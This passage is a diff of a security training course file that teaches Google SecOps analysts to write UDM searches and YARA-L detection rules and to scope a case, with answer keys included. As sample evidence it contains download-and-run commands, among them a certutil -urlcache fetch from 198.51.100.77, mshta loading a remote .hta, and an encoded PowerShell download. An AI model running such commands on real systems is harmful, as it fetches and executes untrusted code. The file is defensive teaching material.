@@ -40,11 +40,11 @@ export const roomsBatch50 = [
   {
     "id": "google-secops-fundamentals",
     "title": "Google SecOps (Chronicle) for Analysts",
-    "description": "Work inside Google Security Operations like an analyst: read raw logs as UDM events, write UDM searches, use entity views, prevalence and threat intelligence, understand YARA-L rules, retrohunt and curated detections, and run a case in SOAR.",
+    "description": "Work inside Google Security Operations like an analyst: read raw logs and UDM events field by field, write the parser's output yourself, write UDM searches, write and debug YARA-L rules (single-event, multi-event and aggregation), judge entities and threat intelligence, scope a case and write its Case Wall note.",
     "difficulty": "intermediate",
     "category": "SIEM",
-    "estimatedMinutes": 65,
-    "xp": 170,
+    "estimatedMinutes": 95,
+    "xp": 335,
     "icon": "🧭",
     "prerequisites": [
       "siem-fundamentals",
@@ -89,44 +89,121 @@ export const roomsBatch50 = [
         }
       },
       {
-        "type": "matching",
-        "id": "gso-m1",
-        "heading": "Map Raw Sysmon Fields to UDM",
-        "instructions": "Kestrel Freight sends Sysmon logs to Google SecOps through the default Sysmon parser. Match each raw Sysmon field to the UDM field the parser fills.",
-        "pairs": [
+        "type": "query_fill",
+        "id": "gso-qf1",
+        "heading": "Be the Parser: Write the UDM Event",
+        "language": "udm",
+        "context": "Kestrel's EDR team forwarded a Sysmon event 1 from kf-ws-0350 and asked what the UDM event will look like once the default Sysmon parser has written it. Raw values: Image C:\\Windows\\System32\\mshta.exe, ParentImage C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE, CommandLine mshta.exe https://kf-docs-share.example/view.hta, User KESTREL\\r.ito. Fill in the event type and the UDM field name on each line. Type field names in full, for example principal.hostname.",
+        "template": "metadata.event_type              = \"{{et}}\"\nmetadata.product_event_type      = \"1\"\nprincipal.hostname               = \"kf-ws-0350\"\n{{f_user}} = \"r.ito\"\n{{f_parent}} = \"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"\n{{f_child}} = \"C:\\Windows\\System32\\mshta.exe\"\n{{f_cmd}} = \"mshta.exe https://kf-docs-share.example/view.hta\"",
+        "blanks": [
           {
-            "id": "p1",
-            "left": "Event 1: Image (the new process)",
-            "right": "target.process.file.full_path"
+            "id": "et",
+            "answers": [
+              "PROCESS_LAUNCH"
+            ],
+            "placeholder": "event type for Sysmon event 1"
           },
           {
-            "id": "p2",
-            "left": "Event 1: ParentImage",
-            "right": "principal.process.file.full_path"
+            "id": "f_user",
+            "answers": [
+              "principal.user.userid"
+            ],
+            "placeholder": "field for the account that ran it"
           },
           {
-            "id": "p3",
-            "left": "Event 1: CommandLine",
-            "right": "target.process.command_line"
+            "id": "f_parent",
+            "answers": [
+              "principal.process.file.full_path"
+            ],
+            "placeholder": "field for the parent process's path"
           },
           {
-            "id": "p4",
-            "left": "Event 1: ParentCommandLine",
-            "right": "principal.process.command_line"
+            "id": "f_child",
+            "answers": [
+              "target.process.file.full_path"
+            ],
+            "placeholder": "field for the new process's path"
           },
           {
-            "id": "p5",
-            "left": "Event 1: User",
-            "right": "principal.user.userid"
-          },
-          {
-            "id": "p6",
-            "left": "Event 22: QueryName",
-            "right": "network.dns.questions.name"
+            "id": "f_cmd",
+            "answers": [
+              "target.process.command_line"
+            ],
+            "placeholder": "field for the new process's command"
           }
         ],
-        "explanation": "On event 1 the launched process goes in target (Image to target.process.file.full_path, CommandLine to target.process.command_line) and its parent goes in principal (ParentImage and ParentCommandLine). User is the account that ran it, so it lands in principal.user.userid. A DNS query (event 22) is a NETWORK_DNS event whose queried name is network.dns.questions.name. Remember the contrast: on event 3 and event 22 the Image is the actor, so it goes to principal.process.file.full_path instead.",
-        "xp": 15
+        "explanation": "Sysmon event 1 becomes a PROCESS_LAUNCH. The new process (mshta.exe) is what was acted on, so its path and command line go to target.process.file.full_path and target.process.command_line. The parent that did the launching (OUTLOOK.EXE) is the actor, so it goes to principal.process.file.full_path, and the account that ran it goes to principal.user.userid. Getting this right is what makes your later searches and rules work: a rule that reads principal.process.command_line here would be reading Outlook's command line, not mshta's. An Office mail client launching mshta.exe with a remote .hta address is worth a search of its own.",
+        "xp": 20
+      },
+      {
+        "type": "log_analysis",
+        "id": "gso-la0",
+        "heading": "Read a UDM Event: A Failed Logon",
+        "context": "The SecOps event viewer shows the UDM event below. It is one of 41 events with the same principal and target between 07:52 and 07:58 UTC. kf-fs-02 is a Kestrel file server, svc_backup is the backup service account, and kf-ws-0417 is a Customer Service workstation. Read the fields, not the alert title.",
+        "event": {
+          "id": "evt-gso-la0-001",
+          "ts": "2026-11-05T07:55:12.000Z",
+          "source": "windows",
+          "vendor": "Google SecOps",
+          "event_type": "auth_failure",
+          "severity": "medium",
+          "hostname": "kf-fs-02",
+          "src_ip": "10.40.9.17",
+          "description": "UDM USER_LOGIN event written by the Windows event log parser.",
+          "raw": {
+            "metadata.event_timestamp": "2026-11-05T07:55:12Z",
+            "metadata.event_type": "USER_LOGIN",
+            "metadata.product_event_type": "4625",
+            "metadata.product_name": "Microsoft-Windows-Security-Auditing",
+            "metadata.log_type": "WINEVTLOG",
+            "principal.hostname": "kf-ws-0417",
+            "principal.ip": "10.40.9.17",
+            "target.hostname": "kf-fs-02",
+            "target.user.userid": "svc_backup",
+            "extensions.auth.type": "MACHINE",
+            "extensions.auth.mechanism": "NETWORK",
+            "security_result.action": "FAIL",
+            "security_result.category": "AUTH_VIOLATION"
+          }
+        },
+        "questions": [
+          {
+            "question": "Which account was someone trying to log on as?",
+            "options": [
+              "svc_backup, from target.user.userid, because on USER_LOGIN the account being logged on is the target",
+              "kf-ws-0417, from principal.hostname, because principal always names the user in a logon event",
+              "kf-fs-02, from target.hostname, because the target of a logon is always an account name",
+              "Nobody can tell, because a failed logon never records the account that was tried"
+            ],
+            "answer": 0,
+            "explanation": "For USER_LOGIN the user being authenticated is target.user.userid, here svc_backup. principal.hostname is the machine the attempt came from, and target.hostname is the server that received it. Failed logons do record the account that was tried, which is exactly why they are useful.",
+            "xp": 10
+          },
+          {
+            "question": "Where did the attempts come from, and how do you know this was a remote logon?",
+            "options": [
+              "From kf-ws-0417 (10.40.9.17): principal is filled only for remote activity, and the mechanism is NETWORK",
+              "From kf-fs-02: the target is where the keyboard was, so the attempts started on the file server",
+              "From the backup software: metadata.product_name names the program that typed the password",
+              "From outside the company: a 4625 is only written for logons that arrive from the internet"
+            ],
+            "answer": 0,
+            "explanation": "On a USER_LOGIN, principal is populated only for remote activity, and here it names kf-ws-0417 at 10.40.9.17. extensions.auth.mechanism NETWORK confirms a network logon. kf-fs-02 is the target that received the attempts. metadata.product_name is the Windows auditing source that wrote the log, not the program that tried the password. 4625 is written for any failed logon, internal or external.",
+            "xp": 10
+          },
+          {
+            "question": "You want every event in this burst. Which UDM Search returns them?",
+            "options": [
+              "metadata.event_type = \"USER_LOGIN\" AND security_result.action = \"FAIL\" AND target.user.userid = \"svc_backup\" AND principal.hostname = \"kf-ws-0417\"",
+              "metadata.event_type = \"USER_LOGIN\" AND security_result.action = \"BLOCK\" AND principal.user.userid = \"svc_backup\" AND principal.hostname = \"kf-ws-0417\"",
+              "metadata.event_type = /USER_.*/ AND security_result.action = \"FAIL\" AND target.user.userid = \"svc_backup\"",
+              "metadata.product_event_type = 4625 AND target.user.userid = svc_backup AND principal.hostname = kf-ws-0417"
+            ],
+            "answer": 0,
+            "explanation": "Copy the values the event actually carries: action FAIL, the account in target.user.userid, the source in principal.hostname. The second query uses BLOCK and puts the account in principal, so it matches nothing here. The third uses a regex on an enumerated field, which is invalid. The fourth leaves the strings unquoted; string values need double quotes. Next step: ask the owner of kf-ws-0417 whether a script on it holds an old svc_backup password, and check whether any attempt in the burst succeeded.",
+            "xp": 10
+          }
+        ]
       },
       {
         "type": "reading",
@@ -147,18 +224,44 @@ export const roomsBatch50 = [
         }
       },
       {
-        "type": "question",
-        "id": "gso-q1",
-        "question": "Priya asks for every launch on kf-ws-0188 whose own command line carries an encoded-command switch (such as -EncodedCommand), matched in any capitalization. Which UDM Search is correct?",
-        "options": [
-          "metadata.event_type = \"PROCESS_LAUNCH\" AND principal.hostname = \"kf-ws-0188\" AND target.process.command_line = /-enc/ nocase",
-          "metadata.event_type = \"PROCESS_LAUNCH\" AND principal.hostname = \"kf-ws-0188\" AND principal.process.command_line = /-enc/ nocase",
-          "metadata.event_type = /PROCESS_.*/ AND principal.hostname = \"kf-ws-0188\" AND target.process.command_line = /-enc/ nocase",
-          "metadata.event_type = \"PROCESS_LAUNCH\" AND principal.hostname = \"kf-ws-0188\" AND target.process.command_line = \"-enc\" nocase"
+        "type": "query_fill",
+        "id": "gso-qf2",
+        "heading": "Write the Search: Encoded PowerShell Across the Fleet",
+        "language": "udm",
+        "context": "Priya wants every PowerShell launch in the company whose own command line carries an encoded-command switch (-enc, -EncodedCommand, in any capitalization), leaving out the jump host kf-adm-01, where the IT team runs signed scripts that way on purpose. Fill in the blanks. You set the time range (last 7 days) with the Time Range control, not in the query.",
+        "template": "metadata.event_type = \"{{et}}\"\nAND target.process.file.full_path = /powershell\\.exe$/ nocase\nAND {{field}} = /\\s-e(nc|ncodedcommand)?\\s/ {{mod}}\nAND {{op}} principal.hostname = \"kf-adm-01\"",
+        "blanks": [
+          {
+            "id": "et",
+            "answers": [
+              "PROCESS_LAUNCH"
+            ],
+            "placeholder": "event type"
+          },
+          {
+            "id": "field",
+            "answers": [
+              "target.process.command_line"
+            ],
+            "placeholder": "the launched process's command line field"
+          },
+          {
+            "id": "mod",
+            "answers": [
+              "nocase"
+            ],
+            "placeholder": "ignore capitalization"
+          },
+          {
+            "id": "op",
+            "answers": [
+              "NOT"
+            ],
+            "placeholder": "exclude"
+          }
         ],
-        "answer": 0,
-        "explanation": "The launched process is target.process, so its own command line is target.process.command_line, and a regex between slashes matches the switch anywhere inside the line. The second query searches principal.process.command_line, which is the parent's command line. The third uses a regex on an enumerated field, which is invalid: list exact event types with OR instead. The fourth uses = with a plain string, which must equal the entire command line, so it would not match a real one.",
-        "xp": 10
+        "explanation": "The launched process is target.process, so its own command line is target.process.command_line; principal.process.command_line would be the parent's. A regex between slashes matches anywhere inside the value, and nocase makes -ENC and -enc both count. NOT removes the IT jump host, and AND joins the conditions (it is also assumed if you leave it out). You cannot put a regex on metadata.event_type because it is an enumerated field, so the event type is an exact quoted value. Read the results by principal.process.file.full_path next: PowerShell started by an Office application is the row to open first.",
+        "xp": 20
       },
       {
         "type": "flag",
@@ -282,7 +385,7 @@ export const roomsBatch50 = [
         "type": "reading",
         "id": "gso-r5",
         "heading": "YARA-L 2.0, Retrohunt and Curated Detections",
-        "content": "**What YARA-L is.** YARA-L 2.0 is the language of Google SecOps detection rules. A rule watches incoming UDM events and raises a detection when its logic is met. A single-event rule has no match window. A multi-event rule joins events over a window.\n\n### Rule anatomy\n\n| Section | Job |\n|---|---|\n| meta | Descriptive fields: author, description, severity |\n| events | Declares event variables such as $e and filters them with UDM fields. Placeholder variables such as $user tie events together |\n| match | Groups events by variables over a time window |\n| outcome | Calculates values per detection, for example count() |\n| condition | Decides when the rule fires, for example #fail >= 5 |\n\nA rule needs meta, events and condition. The order is meta, events, match, outcome, condition.\n\n### Windows\n\n\"over 15m\" creates a hop window: fixed, overlapping windows whose alignment SecOps chooses, with the condition checked inside each one. \"by day\" creates a tumbling window: non-overlapping blocks where each event belongs to exactly one. \"over 5m after $e1\" creates a sliding window anchored to a pivot event, for strict sequences, in rules only. Duration is 1 minute to 48 hours (units m, h, d). To enforce order between events, compare timestamps in the events section, as in the example below.\n\n### Conditions\n\n#fail counts the events bound to $fail. A bare $success means at least one such event exists. Join conditions with and. A rule that needs an event not to exist adds an hour of latency, to allow for late data.\n\n### Retrohunt\n\nA retrohunt runs a rule over stored history to find threats you had not detected. The default range is one week, and for a multi-event rule the range must be at least the match window. If the rule has alerting enabled, a retrohunt creates a SOAR alert for every detection it finds, and large volumes can create overflow cases. Run it with alerting disabled, or make a new rule version, to avoid that.\n\n### Curated detections\n\nGoogle Cloud Threat Intelligence (GCTI) maintains curated detections: YARA-L rule sets for categories such as Cloud, Windows, Linux and macOS threats, plus Applied Threat Intelligence. Each set has precise rules (malicious threats with a high degree of confidence) and broad rules (suspicious behavior that is more common and produces more false positives). A Status toggle enables a set's precise or broad rules and an Alerting toggle decides whether detections alert. New sets start disabled with alerting off, and exclusions help control volume.\n\n### What an analyst asks\n\nDoes the window match how fast this attack really happens? Is the threshold above normal noise? Does the rule alert, or only record?",
+        "content": "**What YARA-L is.** YARA-L 2.0 is the language of Google SecOps detection rules. A rule watches incoming UDM events and raises a detection when its logic is met. A single-event rule has no match window. A multi-event rule joins events over a window.\n\n### Rule anatomy\n\n| Section | Job |\n|---|---|\n| meta | Descriptive fields: author, description, severity |\n| events | Declares event variables such as $e and filters them with UDM fields. Placeholder variables such as $user tie events together |\n| match | Groups events by variables over a time window |\n| outcome | Calculates values per detection, for example count() |\n| condition | Decides when the rule fires, for example #fail >= 5 |\n\nA rule needs meta, events and condition. The order is meta, events, match, outcome, condition.\n\n### Windows\n\n\"over 15m\" creates a hop window: fixed, overlapping windows whose alignment SecOps chooses, with the condition checked inside each one. \"by day\" creates a tumbling window: non-overlapping blocks where each event belongs to exactly one. \"over 5m after $e1\" creates a sliding window anchored to a pivot event, for strict sequences, in rules only. Duration is 1 minute to 48 hours (units m, h, d). To enforce order between events, compare timestamps in the events section, as in the example below.\n\n### Conditions\n\n#fail counts the events bound to $fail. A bare $success means at least one such event exists. Join conditions with and. A rule that needs an event not to exist adds an hour of latency, to allow for late data.\n\n### The building blocks you will type\n\n| You want | You write |\n|---|---|\n| A field on an event | $e.target.process.file.full_path (the event variable, then the UDM path) |\n| Two events about the same thing | The same placeholder on both: $fail.target.user.userid = $user and $success.target.user.userid = $user |\n| Group by that thing over time | match: $user over 15m (the match variable must be a placeholder from events) |\n| Order: B after A | $b.metadata.event_timestamp.seconds > $a.metadata.event_timestamp.seconds |\n| A number per detection | outcome: $n = count($e.metadata.id), or count_distinct(), sum(), max(), min() |\n| A threshold | condition: #e >= 5, or an outcome variable such as $n > 15 |\n| One event is enough | No match section, and condition: $e |\n\nIn a multi-event rule (one with a match section), every outcome value must come from an aggregation function, because one detection covers many events. Regexes work the same way as in UDM Search: /pattern/ nocase.\n\n**Brute force or spray?** Many failures for one account is a brute force: group by the account and count events. Failures from one source across many accounts is a spray: group by the source IP and count_distinct the accounts. The two rules look alike and catch different attacks.\n\n**Test before you trust.** After writing a rule, search UDM for an event you know should match and compare every field in the rule with it. The most common reason a new rule never fires is a field read from principal when the value lives in target, or the reverse.\n\n### Retrohunt\n\nA retrohunt runs a rule over stored history to find threats you had not detected. The default range is one week, and for a multi-event rule the range must be at least the match window. If the rule has alerting enabled, a retrohunt creates a SOAR alert for every detection it finds, and large volumes can create overflow cases. Run it with alerting disabled, or make a new rule version, to avoid that.\n\n### Curated detections\n\nGoogle Cloud Threat Intelligence (GCTI) maintains curated detections: YARA-L rule sets for categories such as Cloud, Windows, Linux and macOS threats, plus Applied Threat Intelligence. Each set has precise rules (malicious threats with a high degree of confidence) and broad rules (suspicious behavior that is more common and produces more false positives). A Status toggle enables a set's precise or broad rules and an Alerting toggle decides whether detections alert. New sets start disabled with alerting off, and exclusions help control volume.\n\n### What an analyst asks\n\nDoes the window match how fast this attack really happens? Is the threshold above normal noise? Does the rule alert, or only record?",
         "codeExample": "rule kf_powershell_then_connection {\n  meta:\n    author = \"Kestrel SOC\"\n    description = \"PowerShell launched, then the same host made an outbound connection\"\n    severity = \"MEDIUM\"\n  events:\n    $proc.metadata.event_type = \"PROCESS_LAUNCH\"\n    $proc.target.process.file.full_path = /powershell\\.exe$/ nocase\n    $proc.principal.hostname = $host\n    $conn.metadata.event_type = \"NETWORK_CONNECTION\"\n    $conn.principal.hostname = $host\n    $conn.metadata.event_timestamp.seconds > $proc.metadata.event_timestamp.seconds\n  match:\n    $host over 10m\n  condition:\n    $proc and $conn\n}",
         "checkpoint": {
           "question": "Which rule section decides whether a detection actually fires?",
@@ -297,70 +400,148 @@ export const roomsBatch50 = [
         }
       },
       {
-        "type": "ordering",
-        "id": "gso-o1",
-        "heading": "Assemble the Rule: Failed Logins, Then a Success",
-        "instructions": "Priya is writing a YARA-L rule that fires when one user has at least five failed logins and then a successful login within 15 minutes. Kestrel's login parser sets security_result.action to FAIL on failures and ALLOW on successes. Put the pieces of the rule in order from top to bottom.",
-        "items": [
+        "type": "query_fill",
+        "id": "gso-yl1",
+        "heading": "Write a YARA-L Rule: Office Starts a Script Host",
+        "language": "yara-l",
+        "context": "Turn the hunt into a detection. Priya wants a single-event rule that fires whenever Word, Excel, PowerPoint or Outlook launches PowerShell, cmd, wscript or mshta. A single-event rule has no match section, and its condition only needs the event variable to exist. Fill in the blanks.",
+        "template": "rule kf_office_spawns_script_host {\n  meta:\n    author = \"Kestrel SOC\"\n    description = \"An Office application launched a script host\"\n    severity = \"HIGH\"\n  events:\n    $e.metadata.event_type = \"{{et}}\"\n    {{parent}} = /(winword|excel|powerpnt|outlook)\\.exe$/ nocase\n    {{child}} = /(powershell|cmd|wscript|mshta)\\.exe$/ nocase\n  condition:\n    {{cond}}\n}",
+        "blanks": [
           {
-            "id": "s6",
-            "text": "outcome: $fail_count = count($fail.metadata.id)"
+            "id": "et",
+            "answers": [
+              "PROCESS_LAUNCH"
+            ],
+            "placeholder": "event type"
           },
           {
-            "id": "s3",
-            "text": "events: $fail.metadata.event_type = \"USER_LOGIN\"  $fail.security_result.action = \"FAIL\"  $fail.target.user.userid = $user"
+            "id": "parent",
+            "answers": [
+              "$e.principal.process.file.full_path"
+            ],
+            "placeholder": "event variable + the parent's path field"
           },
           {
-            "id": "s8",
-            "text": "}"
+            "id": "child",
+            "answers": [
+              "$e.target.process.file.full_path"
+            ],
+            "placeholder": "event variable + the child's path field"
           },
           {
-            "id": "s1",
-            "text": "rule kf_failed_then_success {"
-          },
-          {
-            "id": "s5",
-            "text": "match: $user over 15m"
-          },
-          {
-            "id": "s7",
-            "text": "condition: $fail_count >= 5 and $success"
-          },
-          {
-            "id": "s2",
-            "text": "meta: author = \"Kestrel SOC\"  severity = \"HIGH\""
-          },
-          {
-            "id": "s4",
-            "text": "(still in events) $success.metadata.event_type = \"USER_LOGIN\"  $success.security_result.action = \"ALLOW\"  $success.target.user.userid = $user  $success.metadata.event_timestamp.seconds > $fail.metadata.event_timestamp.seconds"
+            "id": "cond",
+            "answers": [
+              "$e"
+            ],
+            "placeholder": "condition"
           }
         ],
-        "correct_order": [
-          "s1",
-          "s2",
-          "s3",
-          "s4",
-          "s5",
-          "s6",
-          "s7",
-          "s8"
+        "explanation": "In a rule, every UDM field is written behind its event variable, so the fields are $e.principal.process.file.full_path (the Office parent, the actor) and $e.target.process.file.full_path (the launched script host). A single-event rule needs no match window, and the condition $e simply means \"an event like this exists\". The sections stay in the fixed order meta, events, condition. Before you switch alerting on, run the rule as a retrohunt with alerting off and see how many legitimate add-ins or macros it catches, then add exclusions for the approved ones.",
+        "xp": 25
+      },
+      {
+        "type": "query_fill",
+        "id": "gso-yl2",
+        "heading": "Write a Multi-Event Rule: Failed Logons, Then a Success",
+        "language": "yara-l",
+        "context": "Priya needs a rule that fires when one account has at least five failed logons and then a successful one, all within 15 minutes. Kestrel's Windows logon events set security_result.action to FAIL on a failure and ALLOW on a success. The $user placeholder joins both event variables to one account. Fill in the blanks.",
+        "template": "rule kf_failed_logons_then_success {\n  meta:\n    author = \"Kestrel SOC\"\n    severity = \"HIGH\"\n  events:\n    $fail.metadata.event_type = \"USER_LOGIN\"\n    $fail.security_result.action = \"{{fail_action}}\"\n    $fail.{{user_field}} = $user\n\n    $success.metadata.event_type = \"USER_LOGIN\"\n    $success.security_result.action = \"ALLOW\"\n    $success.target.user.userid = $user\n    $success.metadata.event_timestamp.seconds > $fail.metadata.event_timestamp.seconds\n  match:\n    {{match_var}} over {{window}}\n  outcome:\n    $fail_count = count($fail.metadata.id)\n  condition:\n    {{fail_cond}} and $success\n}",
+        "blanks": [
+          {
+            "id": "fail_action",
+            "answers": [
+              "FAIL"
+            ],
+            "placeholder": "failure action"
+          },
+          {
+            "id": "user_field",
+            "answers": [
+              "target.user.userid"
+            ],
+            "placeholder": "the account field on a logon"
+          },
+          {
+            "id": "match_var",
+            "answers": [
+              "$user"
+            ],
+            "placeholder": "group by"
+          },
+          {
+            "id": "window",
+            "answers": [
+              "15m"
+            ],
+            "placeholder": "window"
+          },
+          {
+            "id": "fail_cond",
+            "answers": [
+              "#fail >= 5",
+              "#fail>=5",
+              "#fail > 4",
+              "#fail>4",
+              "$fail_count >= 5",
+              "$fail_count>=5",
+              "$fail_count > 4",
+              "$fail_count>4"
+            ],
+            "placeholder": "at least five failures"
+          }
         ],
-        "explanation": "A rule is the rule name, then its sections in the fixed order meta, events, match, outcome, condition, then the closing brace. Inside events, the success variable compares its timestamp with $fail, so it is written after $fail is declared; that comparison is what enforces failures first, success later. The shared $user placeholder joins both event variables to one account, match: $user over 15m limits the story to 15 minutes, and the condition requires five failures and at least one success.",
-        "xp": 15
+        "explanation": "On USER_LOGIN the account is target.user.userid, so both variables bind it to $user, and match: $user over 15m groups each account's events into 15-minute windows. #fail counts the events bound to $fail (the outcome $fail_count holds the same number and can also be used in the condition), and a bare $success means at least one success exists. The timestamp comparison in events is what makes the success come after the failures. Tune it before alerting: a user who mistypes a password five times and then gets it right also matches, so look at the source host and the account type when it fires.",
+        "xp": 30
+      },
+      {
+        "type": "query_fill",
+        "id": "gso-yl3",
+        "heading": "Write an Aggregation Rule: One Source, Many Accounts",
+        "language": "yara-l",
+        "context": "A password spray is the opposite shape of a brute force: one source tries a few passwords against many accounts. Priya wants a rule that fires when a single source IP fails logons against more than 15 different accounts within 20 minutes. In a multi-event rule, outcome values are calculated with aggregation functions such as count(), count_distinct(), sum(), max() and min(). Fill in the blanks.",
+        "template": "rule kf_password_spray_one_source {\n  meta:\n    author = \"Kestrel SOC\"\n    description = \"One source fails logons against many different accounts\"\n    severity = \"HIGH\"\n  events:\n    $e.metadata.event_type = \"USER_LOGIN\"\n    $e.security_result.action = \"FAIL\"\n    $e.{{src_field}} = $ip\n  match:\n    $ip over 20m\n  outcome:\n    $accounts = {{agg}}($e.target.user.userid)\n  condition:\n    $e and {{cond}}\n}",
+        "blanks": [
+          {
+            "id": "src_field",
+            "answers": [
+              "principal.ip"
+            ],
+            "placeholder": "where a remote logon came from"
+          },
+          {
+            "id": "agg",
+            "answers": [
+              "count_distinct"
+            ],
+            "placeholder": "aggregation function"
+          },
+          {
+            "id": "cond",
+            "answers": [
+              "$accounts > 15",
+              "$accounts>15",
+              "$accounts >= 16",
+              "$accounts>=16"
+            ],
+            "placeholder": "more than 15 accounts"
+          }
+        ],
+        "explanation": "On a remote USER_LOGIN the source is principal, so $e.principal.ip = $ip groups the failures by the address they came from. count_distinct counts different account names, which is what separates a spray (many accounts, few tries each) from a brute force (one account, many tries); count() would fire on one account tried 16 times. An outcome variable can be used in the condition, so $accounts > 15 is the threshold. Watch for a VPN concentrator or a proxy as the source: many users legitimately share that IP, and it belongs in an exclusion.",
+        "xp": 30
       },
       {
         "type": "question",
-        "id": "gso-q2",
-        "question": "Priya's new rule has alerting enabled. She wants to know how often it would have fired over the past week of stored events, without opening a pile of cases. What should she do?",
+        "id": "gso-q4",
+        "question": "Priya's rule below has been enabled for a month and never fired. A retrohunt over 30 days also finds nothing, yet UDM Search shows three launches of certutil.exe -urlcache -f http://198.51.100.77/a.bin on kf-ws-0262 in that period.\n\nrule kf_certutil_download {\n  meta:\n    severity = \"MEDIUM\"\n  events:\n    $e.metadata.event_type = \"PROCESS_LAUNCH\"\n    $e.principal.process.file.full_path = /certutil\\.exe$/ nocase\n    $e.principal.process.command_line = /urlcache/ nocase\n  condition:\n    $e\n}\n\nWhat is wrong?",
         "options": [
-          "Run a retrohunt with alerting off, because each retrohunt detection on an alerting rule creates a SOAR alert",
-          "Run a retrohunt with alerting on, because retrohunt detections stay in the rule view and never reach SOAR",
-          "Copy the rule into UDM Search, because a retrohunt can only run curated detections and never custom rules",
-          "Wait a week for live detections, because a rule cannot be applied to data stored before it was saved"
+          "The rule reads principal, which is the parent; certutil is the launched process, so both lines must use $e.target.process",
+          "A single-event rule needs a match section, so add match: $e over 10m and the rule will fire",
+          "A regular expression cannot be used on a file path field in YARA-L, so the path line must be an exact string",
+          "A retrohunt can only look back seven days, so the three launches were too old for it to find"
         ],
         "answer": 0,
-        "explanation": "A retrohunt applies a rule to stored history, and for an alerting rule it creates a SOAR alert for every detection found. Run it with alerting disabled (or create a rule version with alerting off) to see the volume without alerts or overflow cases. The second option states the opposite of what happens. The third is wrong because retrohunt runs rules on the Rules page, custom ones included, and UDM Search cannot run rule logic such as match windows. The fourth is wrong because looking back at history is exactly what a retrohunt is for.",
-        "xp": 10
+        "explanation": "On a PROCESS_LAUNCH the launched process is target and its parent is principal. As written, the rule looks for an event whose parent is certutil.exe with urlcache in the parent's command line, which almost never exists. Changing both lines to $e.target.process.file.full_path and $e.target.process.command_line fixes it. A single-event rule needs no match section, regex works on path fields, and a retrohunt's range is chosen by you (one week is only the default). The habit to keep: after writing a rule, search UDM for an event you know should match and check every field in the rule against it.",
+        "xp": 15
       },
       {
         "type": "question",
@@ -480,46 +661,61 @@ export const roomsBatch50 = [
         ]
       },
       {
-        "type": "ordering",
-        "id": "gso-o2",
-        "heading": "Run the Case: The Playbook Steps in Order",
-        "instructions": "Case 6130 is confirmed as a document-launched, encoded PowerShell chain on kf-ws-0188 that contacted kestrel-assets-cdn.example. Put the steps of the case playbook in the order an analyst should run them.",
-        "items": [
+        "type": "query_fill",
+        "id": "gso-qf3",
+        "heading": "Scope Case 6130: Who Else Talked to the Domain?",
+        "language": "udm",
+        "context": "The decoded PowerShell in case 6130 downloads from kestrel-assets-cdn.example. Before you block it, find every asset that resolved the domain or sent web requests to it. Lookups are NETWORK_DNS events; the proxy writes NETWORK_HTTP events with the requested host name in the target. Fill in the blanks, then run it over the last 7 days.",
+        "template": "(metadata.event_type = \"{{et_dns}}\" AND network.dns.questions.name = \"{{domain}}\")\nOR\n(metadata.event_type = \"NETWORK_HTTP\" AND {{http_field}} = \"kestrel-assets-cdn.example\")",
+        "blanks": [
           {
-            "id": "t4",
-            "text": "Contain the confirmed host: isolate kf-ws-0188 and revoke l.okoye's sessions, with approval"
+            "id": "et_dns",
+            "answers": [
+              "NETWORK_DNS"
+            ],
+            "placeholder": "event type for a lookup"
           },
           {
-            "id": "t6",
-            "text": "Write the findings and actions on the Case Wall, then close with a reason and root cause"
+            "id": "domain",
+            "answers": [
+              "kestrel-assets-cdn.example"
+            ],
+            "placeholder": "the domain from the decoded command"
           },
           {
-            "id": "t2",
-            "text": "Enrich the entities: the host, the user, the domain and the file hash"
-          },
-          {
-            "id": "t5",
-            "text": "Scope: search UDM for other assets that resolved the domain, then block it"
-          },
-          {
-            "id": "t1",
-            "text": "Read the case overview to see which alerts are grouped and what entities they share"
-          },
-          {
-            "id": "t3",
-            "text": "Verify against the evidence: Word as parent, the encoded command, the domain match, no change ticket"
+            "id": "http_field",
+            "answers": [
+              "target.hostname"
+            ],
+            "placeholder": "field for the requested host"
           }
         ],
-        "correct_order": [
-          "t1",
-          "t2",
-          "t3",
-          "t4",
-          "t5",
-          "t6"
+        "explanation": "Parentheses keep each event type with its own field, and OR joins the two halves. A lookup's name is network.dns.questions.name; a web request's destination host is target.hostname. Group the results by principal.hostname: each host in the list is a candidate for the same infection, and a host that only resolved the domain without a PowerShell launch still needs its process history checked. Only after this list is complete do you block the domain, so you do not lose sight of hosts that already reached it.",
+        "xp": 20
+      },
+      {
+        "type": "written_report",
+        "id": "gso-wr1",
+        "heading": "Write the Case Wall Note and Close Case 6130",
+        "context": "Case 6130 facts. 10:12 l.okoye opened Invoice_KF-88213.docm from Downloads on kf-ws-0188. 10:14:52 WINWORD.EXE launched powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand; decoded, it downloads https://kestrel-assets-cdn.example/p. 10:14:53 kf-ws-0188 resolved kestrel-assets-cdn.example and at 10:14:54 the proxy recorded a GET to it. Your scoping search over 7 days returned kf-ws-0188 only. 10:31 the Isolate host action ran on kf-ws-0188 after approval, and l.okoye's sessions were revoked. 10:40 the domain was blocked at the proxy. No change ticket mentions the document or the domain.",
+        "prompt": "Write the note you would post on the Case Wall before closing: what happened, the evidence (host, user, file, parent and child process, domain), the scope, the actions taken and what is still open, and the close reason and root cause you will pick.",
+        "rubricHints": [
+          "Name the host, the user, the document, the parent and child process and the domain exactly as they appear in the case",
+          "Say how you scoped it (which search, what range) and what it returned",
+          "List actions with times, and say what is still open, such as reimaging or mail search for the same attachment",
+          "Finish with the close reason (Malicious, Not malicious, Maintenance or Inconclusive) and a root cause"
         ],
-        "explanation": "Start by understanding the case, then enrich the entities so the evidence is complete, then verify before any disruptive action. Contain the confirmed host first to stop the beacon, then scope outward from the shared domain to find other assets and block it for everyone. Documenting and closing come last, so the Case Wall records what was actually done and the close reason is true.",
-        "xp": 15
+        "referenceIocs": [
+          "kf-ws-0188",
+          "l.okoye",
+          "Invoice_KF-88213.docm",
+          "WINWORD.EXE",
+          "powershell.exe",
+          "kestrel-assets-cdn.example"
+        ],
+        "minWords": 120,
